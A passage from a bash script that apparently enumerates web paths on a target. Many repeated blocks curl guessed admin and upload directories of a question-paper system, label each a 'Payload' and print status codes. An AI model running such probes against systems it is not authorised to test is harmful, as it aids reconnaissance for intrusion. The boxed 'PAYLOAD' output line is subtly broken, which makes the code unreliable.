         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ModuleQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ModuleQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
